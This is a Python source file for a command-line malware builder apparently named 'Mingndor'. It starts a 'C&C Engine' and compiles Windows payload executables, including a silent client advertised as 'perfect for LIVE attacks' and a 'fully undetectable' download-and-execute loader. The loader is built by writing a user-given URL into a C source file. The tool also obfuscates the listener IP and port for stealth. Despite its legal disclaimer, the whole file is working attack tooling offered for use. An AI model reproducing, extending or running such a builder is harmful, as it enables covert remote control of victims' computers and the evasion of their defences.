from payload.payload import Payload
from payload.encry_IP import IP_Obfuscator
from payload.payload import SilentDE
import sys
import urllib.request
import os
import time
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from lib.pyc import pypython
from rich import print
from rich.prompt import Prompt
from rich.text import Text
from rich.style import Style

# Initialize rich console
console = Console()

def banner():
    banner = """
     ███▄ ▄███▓ ██▓ ███▄    █   ▄████  ███▄    █ ▓█████▄  ▒█████   ██▀███  
    ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒ ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒
    ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▓██  ▀█ ██▒░██   █▌▒██░  ██▒▓██ ░▄█ ▒
    ▒██    ▒██ ░██░▓██▒  ▐▌██▒░▓█  ██▓▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██▀▀█▄    Author: AuxGrep
    ▒██▒   ░██▒░██░▒██░   ▓██░░▒▓███▀▒▒██░   ▓██░░▒████▓ ░ ████▓▒░░██▓ ▒██▒        @2025
    ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░  ░      ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░
    ░      ░    ▒ ░   ░   ░ ░ ░ ░   ░    ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░ 
           ░    ░           ░       ░          ░    ░        ░ ░     ░     
                                              ░      ░        
    """
    console.print(Panel.fit(banner, style="bold red"))

def check_internet_connection():
    try:
        urllib.request.urlopen('https://www.google.com', timeout=10)
        return True
    except urllib.request.URLError:
        return False

def show_disclaimer():
    disclaimer_table = Table(show_header=True, header_style="bold red")
    disclaimer_table.add_column("⚠️  DISCLAIMER  ⚠️", style="bold red", justify="center")
    
    disclaimer_text = Text()
    disclaimer_text.append("\nThis tool is for educational and authorized security testing purposes only.\n\n")
    disclaimer_text.append("• Use only on systems you own or have explicit permission to test\n")
    disclaimer_text.append("• Unauthorized use may violate laws and regulations\n")
    disclaimer_text.append("• The author is not responsible for any misuse or damage\n")
    disclaimer_text.append("• By proceeding, you acknowledge and accept full responsibility\n")
    
    disclaimer_table.add_row(disclaimer_text)
    
    console.print(Panel.fit(disclaimer_table, title="[bold red]LEGAL NOTICE[/bold red]", border_style="red"))
    
    # Get user confirmation
    proceed = Prompt.ask("\n[bold]Do you understand and agree to proceed?[/bold]", choices=["y", "n"], default="n")
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    loading_animation("[cyan]Starting the C&C Engine...[/cyan]")
    time.sleep(4)
    if proceed.lower() != "y":
        console.print("[yellow]Operation cancelled by user[/yellow]")
        sys.exit(0)
    if check_internet_connection():
        pass
    else:
        console.print("[bold red]No internet connection detected[/bold red]")
        sys.exit(1)
    loading_animation("[cyan]Preparing the C&C Engine...[/cyan]")
    result = pypython.c2_engine()
    if result == 'Success':
        console.print("[bold green]✓ C&C Engine initialized successfully![/bold green]")
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
    else:
        console.print("[bold yellow]⚠ C&C Engine initialization status: " + result + "[/bold yellow]")
        sys.exit(1)
    
    return True

def show_menu():
    menu = [
        ('1. Build Payload', "Build a custom payload"),
        ('2. Enc IP & PORT (FUD 100%)', "Obfuscate IP and PORT for stealth"),
        ('3. Download and Run', "Download and Run payload from URL"),
        ('4. Exit', "Exit the program")
    ]
    
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Option", style="cyan", width=30)
    table.add_column("Description", style="green")
    
    for option, desc in menu:
        table.add_row(option, desc)
    
    console.print(Panel.fit(table, title="[bold]Main Menu[/bold]", border_style="blue"))

def loading_animation(task_description):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        progress.add_task(description=task_description, total=None)
        time.sleep(2)

def detectable_payload():
    try:
        loading_animation("[cyan]Fetching Payloads...[/cyan]")
        # Get all .c files in current directory
        c_files = [f for f in os.listdir(str(os.getcwd())) if f.endswith('.c')]
        
        menu = [
            ('Ninja-client (Non-Silent)', 'Standard payload with visible command prompt window - suitable for testing and demonstration'),
            ('Ninja-Delivery loader (FUD)', 'Fully Undetectable loader with advanced evasion techniques to Download and Execute payload from URL'),
            ('Ninja-client (Silent Mode)', 'Stealth payload that runs without command prompt - perfect for LIVE attacks')
        ]
        
        if not c_files:
            console.print("[red]No .c files found in the current directory![/red]")
            return None
            
        # Display available payloads in a rich table
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Option", style="cyan", width=30)
        table.add_column("Description", style="green")
        
        for option, desc in menu:
            table.add_row(option, desc)
            
        console.print("\n[bold cyan]Available Payloads:[/bold cyan]")
        console.print(Panel.fit(table, title="[bold]Payload Selection[/bold]", border_style="blue"))
            
        # Get user input with validation
        while True:
            try:
                choice = console.input('\n[green]Enter the number of the payload you want to build (or "q" to quit): [/green]')
                
                if choice.lower() == 'q':
                    console.print("[yellow]Operation cancelled by user[/yellow]")
                    return None
                    
                choice = int(choice)
                if 1 <= choice <= len(c_files):
                    selected_file = c_files[choice - 1]
                    console.print(f"\n[green]Selected payload: {selected_file}[/green]")
                    return selected_file
                else:
                    console.print("[red]Invalid selection! Please choose a number from the list.[/red]")
            except ValueError:
                console.print("[red]Please enter a valid number![/red]")
                
    except Exception as e:
        console.print(f"[red]Error in detectable_payload: {str(e)}[/red]")
        return None

def encrypt_ip_port():
    try:
        console.clear()
        console.print(Panel.fit("[bold]Encrypt LHOST and LPORT[/bold]", style="blue"))
        
        IP = Prompt.ask("[bold cyan]Enter IP[/bold cyan]")
        PORT = Prompt.ask("[bold cyan]Enter PORT[/bold cyan]")
        
        loading_animation("[magenta]Obfuscating IP and PORT...[/magenta]")
        IP_Obfuscator.obfuscate_ip(IP, PORT)
        console.print("[bold green]✓ IP and PORT obfuscated successfully![/bold green]")
    except Exception as e:
        console.print(f"[bold red]✗ Error occurred: {e}[/bold red]")
        sys.exit(1)

def download_and_run():
    try:
        console.clear()
        loading_animation("[cyan]Please Wait!!!...[/cyan]")
        time.sleep(2)
        console.print(Panel.fit("[bold]Download and Run[/bold]", style="blue"))
        new_url = Prompt.ask("[bold cyan]Enter the Direct URL (https://example.com/q.exe)[/bold cyan]")
        
        # Read and update d-and-e2.c
        with open('d-and-e2.c', 'r') as file:
            lines = file.readlines()
        lines[8] = f'    const char* url = "{new_url}";\n' 
        with open('d-and-e2.c', 'w') as file:
            file.writelines(lines)  
        
        console.print("[bold green]✓ URL updated successfully![/bold green]")
        time.sleep(2)
        
        # Build the payload using d-and-e2.c
        SilentDE.Silent(payload='d-and-e2.c', out='stargate.exe')
        console.print("[bold green]✓ Payload built successfully![/bold green]")

    except Exception as e:
        console.print(f"[bold red]✗ Error occurred: {e}[/bold red]")
        sys.exit(1)

if __name__ == "__main__":
    try:
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            banner()
            if not show_disclaimer():
                break
            show_menu()
            
            choice = Prompt.ask("\n[bold]Enter your choice[/bold]", choices=["1", "2", "3", "4"])
            
            if choice == '1':
                payload = detectable_payload()
                if payload:
                    Payload.payload_build(payload=payload, out='tzcyberninja.exe')
                    console.print("[bold green]✓ Payload built successfully![/bold green]")
                Prompt.ask("\n[bold]Press Enter to continue...[/bold]")
            elif choice == '2':
                encrypt_ip_port()
            elif choice == '3':
                download_and_run()
                Prompt.ask("\n[bold]Press Enter to continue...[/bold]")
            elif choice == '4':
                break

    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operation cancelled by user. Exiting...[/bold yellow]")
        sys.exit(0)